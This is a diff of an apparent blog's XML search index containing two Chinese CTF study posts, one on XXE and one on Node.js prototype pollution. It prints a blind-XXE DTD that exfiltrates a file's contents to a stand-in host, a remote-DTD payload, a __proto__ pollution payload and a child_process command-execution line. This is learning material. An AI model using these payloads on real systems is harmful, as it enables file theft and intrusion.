@@ -136,71 +136,55 @@
       </tags>
   </entry>
   <entry>
-    <title>XXE漏洞学习</title>
-    <url>/2024/02/27/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
-    <content><![CDATA[<h1 id="基于xml文档使用中产生的漏洞"><a href="#基于xml文档使用中产生的漏洞" class="headerlink" title="基于xml文档使用中产生的漏洞"></a>基于xml文档使用中产生的漏洞</h1><span id="more"></span>
+    <title>node.js原型链污染</title>
+    <url>/2024/03/11/node-js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
+    <content><![CDATA[<h1 id="好东西"><a href="#好东西" class="headerlink" title="好东西"></a>好东西</h1><span id="more"></span>
 
-<h1 id="XML文档介绍"><a href="#XML文档介绍" class="headerlink" title="XML文档介绍"></a>XML文档介绍</h1><p>xml与html很类似，xml被用来传输数据，html被用来显示数据</p>
-<p>xml文档可为传输的数据进行分类，比如用户填入的数据,姓名，年龄等会以树状结构存储的xml文档中</p>
-<p>1.元素，如<body></body>,老生常态，写法和html几乎一样</p>
-<p>2.属性，与html几乎一样</p>
-<p>3.实体:用来定义普通文本的变量。实体引用是对实体的引用。有点抽象，其实把它当成一个代名词就好</p>
-<p>4.PCDATA:PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。就比如我们的自己定义的元素，属性，这会被解析器当作是特殊的</p>
-<p>5.CDATA:是不会被解析器解析的文本,在xml中保留了一些特殊的字符，比如&amp;,&lt;,当你在文本中不想他们被标记为特殊字符时，就给这段文本标作CDATA</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227165634626.png"  alt="image-20240227165634626"></p>
-<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>假设我把用户的数据存储在了xml文档中，我怎么让数据传输到前端并展示呢</p>
-<h2 id="xml文档"><a href="#xml文档" class="headerlink" title="xml文档"></a>xml文档</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170016299.png"  alt="image-20240227170016299"></p>
-<h2 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170324785.png"  alt="image-20240227170324785"></p>
-<h2 id="实现函数"><a href="#实现函数" class="headerlink" title="实现函数"></a>实现函数</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170349022.png"  alt="image-20240227170349022"></p>
-<p>这里用var_dump()看看他是怎么存储的，实际上就是以每个标签命名，作为myself对象中的一个属性，并把标签中的文本当作属性值，如果有多个标签，就建立一个数组</p>
-<p>如果有嵌套的标签,就再创建一个对象，把它包含的标签再当作属性放在里面</p>
-<p>1.simplexml_loader_file:获取一个xml文档，并把它转为一个对象</p>
-<p>3.file_get_contents:读取一个文件，并把文件内容转为字符串</p>
-<p>2.simplexml_loader_string:读取一个字符串，并把它转化为一个对象</p>
-<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>理解漏洞，我们需要理解xml中dtd文件和实体的使用</p>
-<h3 id="dtd"><a href="#dtd" class="headerlink" title="dtd"></a>dtd</h3><p>dtd文件实际就是用来存储上述<code>&lt;!ELEMENT&gt;</code>等声明的文件，它可以内部声明，也可以外部引用。上述实例中我们使用的就是内部声明，现在我们来介绍外部引用</p>
-<p>创建一个t.dtd文件</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171708419.png"  alt="image-20240227171708419"></p>
-<p>外部引用它，语法为<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;t.dtd&quot;&gt;</code></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171849486.png"  alt="image-20240227171849486"></p>
-<p>正常显示</p>
-<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>语法<code>&lt;!ENTITY 实体名称 &quot;实体所代的东西&quot;&gt;</code>,引用的两种方式</p>
-<p>1.&amp;实体名;(若要引用外部的实体要在实体名称和实体所代的东西之间加个SYSTEM);</p>
-<p>2.%实体名;这个只能在dtd中使用</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227172352172.png"  alt="image-20240227172352172"></p>
-<p>可以看到我这里用了叫jump的实体来代名”跳”，而后就会为jump创建一个对象，把”跳”放里面，所以说是实体把，因为它是真真实实存在的一个对象</p>
-<h3 id="实体代名支持的协议"><a href="#实体代名支持的协议" class="headerlink" title="实体代名支持的协议"></a>实体代名支持的协议</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227172609101.png"  alt="image-20240227172609101"></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="NCTF-2019-Fake-XML-cookbook"><a href="#NCTF-2019-Fake-XML-cookbook" class="headerlink" title="[NCTF 2019]Fake XML cookbook"></a>[NCTF 2019]Fake XML cookbook</h2><h3 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214415944.png"  alt="image-20240227214415944"></p>
-<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214519453.png"  alt="image-20240227214519453"></p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214625769.png"  alt="image-20240227214625769"></p>
-<p>漏洞点已经非常清晰，这里我们输入的用户密码是以xml文档的形式发回，但是后端代码有错误，报错信息把username所带的值一起发回来了，所以我们只要修改username的值就可以做到文件读取，构造如下</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214812065.png"  alt="image-20240227214812065"></p>
-<p>这里不知道它的dtd是什么，所以我们再创建一个dtd声明也没事，只要用了其中的一个根元素即可，这里我试过了用xxe或者user作根元素都是可以打通的</p>
-<p><img   src="/../img/$%7Bfiilename%7D/image-20240227215140471.png"  alt="image-20240227215140471"></p>
-<h2 id="无回显xxe"><a href="#无回显xxe" class="headerlink" title="无回显xxe"></a>无回显xxe</h2><p>有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据，先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器。</p>
-<p>　<strong>xml.php</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>　<strong>test.dtd</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM</span><br><span class="line">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/xxx.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxx?p=file;&#x27;&gt;&quot;&gt; </span><br></pre></td></tr></table></figure>
-
-<p>　<strong>payload</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
-
-<p>　我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
-<p>这里由于没有找到例题，直接抄合天的了</p>
-<p>新学的linux命令</p>
-<p>grep -i “GET” xxx.log</p>
-<p>这里在日志文件查看外带数据，由于我们是GET传参，所以我们输入关键字GET过滤可以看得快一点</p>
-<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>xxe在我搜集资料的时候能做的还有很多，比如内网探测，命令执行……之后有时间再回来学</p>
+<h1 id="基本介绍"><a href="#基本介绍" class="headerlink" title="基本介绍"></a>基本介绍</h1><p>原型链污染其实就是围绕着两个属性做文章</p>
+<p>属性<code>__proto__</code></p>
+<p>属性<code>prototype</code></p>
+<h2 id="从用法角度介绍"><a href="#从用法角度介绍" class="headerlink" title="从用法角度介绍"></a>从用法角度介绍</h2><p>试想一些通用的方法，我们是如何调用的呢，如<code>toString()</code></p>
+<p>我们在nodejs命令执行中写过一个</p>
+<p>payload:eval&#x3D;require(‘child_process’).spawnSync(‘tac’,[‘fl001g.txt’]).stdout.toString()</p>
+<p>那时我上官网文档里查看了一下child_process类中并没有toString()方法</p>
+<p>那它哪来的呢？</p>
+<h2 id="proto-和prototype"><a href="#proto-和prototype" class="headerlink" title="__proto__和prototype"></a><code>__proto__</code>和prototype</h2><p>首先这两都是属性，都是默认内置在每个对象当中</p>
+<p>prototype指向一个原型对象，这个对象很基础，包含了很多通用的方法和属性，比如刚刚的<code>toString()</code></p>
+<p><code>__proto__</code>则指向object.prototype，实际上也是指向原型对象</p>
+<p>问题还没解答，那toString()怎么用的呢?</p>
+<p>这就要说一下prototype的一些机制，当调用一个对象中的属性和方法时，先是在对象中寻找，若有则用，若无则去prototype指向的原型的对象中去找.</p>
+<p>以下为实验</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311164432778.png"  alt="image-20240311164432778"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311164445047.png"  alt="image-20240311164445047"></p>
+<p>可见b对象虽为空，但还是输出了go中的2</p>
+<p>到这里理论已经形成，下面看看实战</p>
+<h1 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h1><h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><p>题目给了源码，快进到路由中的login.js</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311165617963.png"  alt="image-20240311165617963"></p>
+<p>要求:让secert(作者是故意还是不小心打错的)中的ctfshow等于36dboy即可输出flag</p>
+<p>很容易就想到了原型链污染，在原型对象中注入一个ctfshow:36dboy即可</p>
+<p>那注入点在哪？</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311170233201.png"  alt="image-20240311170233201"></p>
+<p>这里搞了个什么处理，打开utils中的common.js康康</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311170337591.png"  alt="image-20240311170337591"></p>
+<p>真是炸炸又刚刚啊，简单介绍一下就是把我们写入的数据copy到了user对象中</p>
+<p>详细解释:</p>
+<p>1.传入两个对象，一个是user,一个是req.body,req.body由我们所控</p>
+<p>2.定义一个key不断读取req.body中的键名</p>
+<p>3.如果这个键名在user中存在，则继续调用copy，如果不存在则在则让user创建一个和key同名的键名，并且存储和req.body中相同的键值</p>
+<p>4.key读完了自动就跳出循环了</p>
+<p>抓个包看看它咋写</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311171328658.png"  alt="image-20240311171328658"></p>
+<p><code>payload:&#123;&quot;__proto__&quot;:&#123;&quot;ctfshow&quot;:&quot;36dboy&quot;&#125;&#125;</code></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311172433837.png"  alt="image-20240311172433837"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240311172445135.png"  alt="image-20240311172445135"></p>
+<p>带出来了</p>
 ]]></content>
       <categories>
         <category>学习</category>
       </categories>
       <tags>
-        <tag>ctf</tag>
-        <tag>入门</tag>
         <tag>学习</tag>
+        <tag>js</tag>
       </tags>
   </entry>
   <entry>
@@ -277,6 +261,74 @@
         <tag>学习</tag>
         <tag>ctfshow</tag>
         <tag>js</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>XXE漏洞学习</title>
+    <url>/2024/02/27/XXE%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/</url>
+    <content><![CDATA[<h1 id="基于xml文档使用中产生的漏洞"><a href="#基于xml文档使用中产生的漏洞" class="headerlink" title="基于xml文档使用中产生的漏洞"></a>基于xml文档使用中产生的漏洞</h1><span id="more"></span>
+
+<h1 id="XML文档介绍"><a href="#XML文档介绍" class="headerlink" title="XML文档介绍"></a>XML文档介绍</h1><p>xml与html很类似，xml被用来传输数据，html被用来显示数据</p>
+<p>xml文档可为传输的数据进行分类，比如用户填入的数据,姓名，年龄等会以树状结构存储的xml文档中</p>
+<p>1.元素，如<body></body>,老生常态，写法和html几乎一样</p>
+<p>2.属性，与html几乎一样</p>
+<p>3.实体:用来定义普通文本的变量。实体引用是对实体的引用。有点抽象，其实把它当成一个代名词就好</p>
+<p>4.PCDATA:PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。就比如我们的自己定义的元素，属性，这会被解析器当作是特殊的</p>
+<p>5.CDATA:是不会被解析器解析的文本,在xml中保留了一些特殊的字符，比如&amp;,&lt;,当你在文本中不想他们被标记为特殊字符时，就给这段文本标作CDATA</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227165634626.png"  alt="image-20240227165634626"></p>
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>假设我把用户的数据存储在了xml文档中，我怎么让数据传输到前端并展示呢</p>
+<h2 id="xml文档"><a href="#xml文档" class="headerlink" title="xml文档"></a>xml文档</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170016299.png"  alt="image-20240227170016299"></p>
+<h2 id="展示"><a href="#展示" class="headerlink" title="展示"></a>展示</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170324785.png"  alt="image-20240227170324785"></p>
+<h2 id="实现函数"><a href="#实现函数" class="headerlink" title="实现函数"></a>实现函数</h2><p><img   src="/../img/$%7Bfiilename%7D/image-20240227170349022.png"  alt="image-20240227170349022"></p>
+<p>这里用var_dump()看看他是怎么存储的，实际上就是以每个标签命名，作为myself对象中的一个属性，并把标签中的文本当作属性值，如果有多个标签，就建立一个数组</p>
+<p>如果有嵌套的标签,就再创建一个对象，把它包含的标签再当作属性放在里面</p>
+<p>1.simplexml_loader_file:获取一个xml文档，并把它转为一个对象</p>
+<p>3.file_get_contents:读取一个文件，并把文件内容转为字符串</p>
+<p>2.simplexml_loader_string:读取一个字符串，并把它转化为一个对象</p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>理解漏洞，我们需要理解xml中dtd文件和实体的使用</p>
+<h3 id="dtd"><a href="#dtd" class="headerlink" title="dtd"></a>dtd</h3><p>dtd文件实际就是用来存储上述<code>&lt;!ELEMENT&gt;</code>等声明的文件，它可以内部声明，也可以外部引用。上述实例中我们使用的就是内部声明，现在我们来介绍外部引用</p>
+<p>创建一个t.dtd文件</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171708419.png"  alt="image-20240227171708419"></p>
+<p>外部引用它，语法为<code>&lt;!DOCTYPE 根元素 SYSTEM &quot;t.dtd&quot;&gt;</code></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227171849486.png"  alt="image-20240227171849486"></p>
+<p>正常显示</p>
+<h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><p>语法<code>&lt;!ENTITY 实体名称 &quot;实体所代的东西&quot;&gt;</code>,引用的两种方式</p>
+<p>1.&amp;实体名;(若要引用外部的实体要在实体名称和实体所代的东西之间加个SYSTEM);</p>
+<p>2.%实体名;这个只能在dtd中使用</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227172352172.png"  alt="image-20240227172352172"></p>
+<p>可以看到我这里用了叫jump的实体来代名”跳”，而后就会为jump创建一个对象，把”跳”放里面，所以说是实体把，因为它是真真实实存在的一个对象</p>
+<h3 id="实体代名支持的协议"><a href="#实体代名支持的协议" class="headerlink" title="实体代名支持的协议"></a>实体代名支持的协议</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227172609101.png"  alt="image-20240227172609101"></p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h2 id="NCTF-2019-Fake-XML-cookbook"><a href="#NCTF-2019-Fake-XML-cookbook" class="headerlink" title="[NCTF 2019]Fake XML cookbook"></a>[NCTF 2019]Fake XML cookbook</h2><h3 id="题面"><a href="#题面" class="headerlink" title="题面"></a>题面</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214415944.png"  alt="image-20240227214415944"></p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p><img   src="/../img/$%7Bfiilename%7D/image-20240227214519453.png"  alt="image-20240227214519453"></p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214625769.png"  alt="image-20240227214625769"></p>
+<p>漏洞点已经非常清晰，这里我们输入的用户密码是以xml文档的形式发回，但是后端代码有错误，报错信息把username所带的值一起发回来了，所以我们只要修改username的值就可以做到文件读取，构造如下</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227214812065.png"  alt="image-20240227214812065"></p>
+<p>这里不知道它的dtd是什么，所以我们再创建一个dtd声明也没事，只要用了其中的一个根元素即可，这里我试过了用xxe或者user作根元素都是可以打通的</p>
+<p><img   src="/../img/$%7Bfiilename%7D/image-20240227215140471.png"  alt="image-20240227215140471"></p>
+<h2 id="无回显xxe"><a href="#无回显xxe" class="headerlink" title="无回显xxe"></a>无回显xxe</h2><p>有回显的情况可以直接在页面中看到Payload的执行结果或现象，无回显的情况又称为blind xxe，可以使用外带数据通道提取数据，先使用php:&#x2F;&#x2F;filter获取目标文件的内容，然后将内容以http请求发送到接受数据的服务器。</p>
+<p>　<strong>xml.php</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">libxml_disable_entity_loader (false);</span><br><span class="line">$xmlfile = file_get_contents(&#x27;php://input&#x27;);</span><br><span class="line">$dom = new DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>　<strong>test.dtd</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM</span><br><span class="line">&quot;php://filter/read=convert.base64-encode/resource=file:///c:/xxx.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY &amp;#37; send SYSTEM &#x27;http://xxx?p=file;&#x27;&gt;&quot;&gt; </span><br></pre></td></tr></table></figure>
+
+<p>　<strong>payload</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>
+
+<p>　我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>%</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</p>
+<p>这里由于没有找到例题，直接抄合天的了</p>
+<p>新学的linux命令</p>
+<p>grep -i “GET” xxx.log</p>
+<p>这里在日志文件查看外带数据，由于我们是GET传参，所以我们输入关键字GET过滤可以看得快一点</p>
+<h1 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h1><p>xxe在我搜集资料的时候能做的还有很多，比如内网探测，命令执行……之后有时间再回来学</p>
+]]></content>
+      <categories>
+        <category>学习</category>
+      </categories>
+      <tags>
+        <tag>ctf</tag>
+        <tag>入门</tag>
+        <tag>学习</tag>
       </tags>
   </entry>
   <entry>
